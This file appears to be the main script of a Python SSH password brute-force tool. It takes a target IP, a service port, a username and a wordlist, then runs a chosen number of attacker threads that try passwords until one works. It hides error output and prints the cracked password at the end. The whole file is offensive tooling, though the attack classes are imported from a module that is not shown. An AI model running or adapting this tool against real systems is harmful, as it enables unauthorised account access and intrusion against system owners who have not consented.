import sys
from argparser import argparse
from sshattack import SSHTarget, SSHAttacker

if __name__ == '__main__':
    f = open('/dev/null', 'w')
    sys.stderr = f

    portmap = {"ftp": 21, "ssh": 22, "telnet": 23}
    (options, ip_addr, service) = argparse(sys.argv, portmap)

    if options.port is not None:
        portmap[service] = options.port

    target = SSHTarget(
        ip_addr,
        portmap[service],
        options.login,
        options.wordlist,
    )

    attackers = []
    for i in range(0, options.threads):
        attacker = SSHAttacker(target)
        attackers.append(attacker)
    for attacker in attackers:
        attacker.start()

    try:
        with open(target.wordlist) as passwords:
            while SSHAttacker.finish is False:
                if target.queue_empty():
                    # fill the queue if it is empty and check for EOF
                    if target.queue_fill(passwords) is False:
                        break
            # wait for other threads to try all passwords
            while not target.queue_empty() and SSHAttacker.finish is False:
                pass
    except (SystemExit, KeyboardInterrupt):
        print("KeyboardInterrupt received, quitting...")
    finally:
        SSHAttacker.finish = True
        for attacker in attackers:
            attacker.join()

    print("\n-=-=-=-=-=  STATISTICS =-=-=-=-=-=-")
    print("Successful: %s" % ("YES" if SSHAttacker.success else "NO"))
    print("IP addr: %s" % (ip_addr))
    print("Service: %s" % (service))
    print("Port: %d" % (target.port))
    print("Username: %s" % (target.login))
    print("Password: %s" % ("?" if not SSHAttacker.success else SSHAttacker.password))
    print("Total attempts: %d" % (sum(attacker.tries for attacker in attackers)))
    print("-=-=-=-=-=-=-=-=-=-=-=-=--==-=-=-=-")
